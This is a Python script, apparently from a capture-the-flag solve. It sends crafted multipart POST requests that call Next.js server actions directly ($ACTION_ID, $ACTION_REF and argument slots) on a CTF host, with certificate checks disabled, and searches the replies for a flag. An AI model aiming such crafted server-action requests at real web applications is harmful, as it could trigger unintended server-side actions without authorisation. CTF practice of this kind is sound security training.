#!/usr/bin/env python3
"""Investigate the action.

We have an unbound MPA action. Send $ACTION_ID_<id> + a $ACTION_KEY_<id>:0
encoded RSC arg. Also try $ACTION_REF_<id> with full descriptor.
"""
import urllib.request, ssl, json
URL = "https://funicular-gm2cxozn.alfactf.ru/"
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def fetch(method, headers=None, body=None):
    req = urllib.request.Request(URL, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def multipart(fields):
    boundary = "----X1234ABC"
    parts = []
    for k, v in fields:
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
        parts.append(v.encode() if isinstance(v, str) else v)
        parts.append(b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    return boundary, b"".join(parts)


def show(label, data):
    s = data.decode("utf-8", "replace") if isinstance(data, bytes) else str(data)
    # Look for restored:true / output / recovery / flag / error
    for needle in ('"restored":true', "alfa{", "FLAG", "ОШИБКА", "восстановл", "успех", "УСПЕХ", "монтаж", "output", "message", "error"):
        if needle in s:
            i = s.find(needle)
            print(f"  [{label}] match {needle!r} @ {i}: {s[max(0,i-80):i+200]!r}")


# A) Just $ACTION_ID
boundary, body = multipart([(f"$ACTION_ID_{ACTION_ID}", "")])
status, h, data = fetch("POST", {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
print("A status", status, "len", len(data))
show("A", data)

# B) $ACTION_ID with $ACTION_<id>:0 arg slot
for arg in ("[]", "null", '"hello"', json.dumps([{"action": "recover"}]), "1:[]\n0:\"$@1\"\n"):
    boundary, body = multipart([
        (f"$ACTION_ID_{ACTION_ID}", ""),
        (f"$ACTION_{ACTION_ID}:0", arg),
    ])
    status, h, data = fetch("POST", {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
    print(f"B arg={arg!r} status", status, "len", len(data))
    show(f"B {arg!r}", data)

# C) $ACTION_REF with proper descriptor: {"id":"<id>","bound":null}
descriptor = json.dumps({"id": ACTION_ID, "bound": None})
boundary, body = multipart([
    (f"$ACTION_REF_{ACTION_ID}", ""),
    (f"$ACTION_{ACTION_ID}:0", descriptor),
])
status, h, data = fetch("POST", {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
print("C status", status, "len", len(data))
print(data[:500])

# D) $ACTION_REF with bound RSC stream
descriptor = '{"id":"' + ACTION_ID + '","bound":null}'
boundary, body = multipart([
    (f"$ACTION_REF_{ACTION_ID}", ""),
    (f"$ACTION_{ACTION_ID}:0", descriptor),
    (f"$ACTION_{ACTION_ID}:1", "[]"),
])
status, h, data = fetch("POST", {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
print("D status", status, "len", len(data))
print(data[:500])
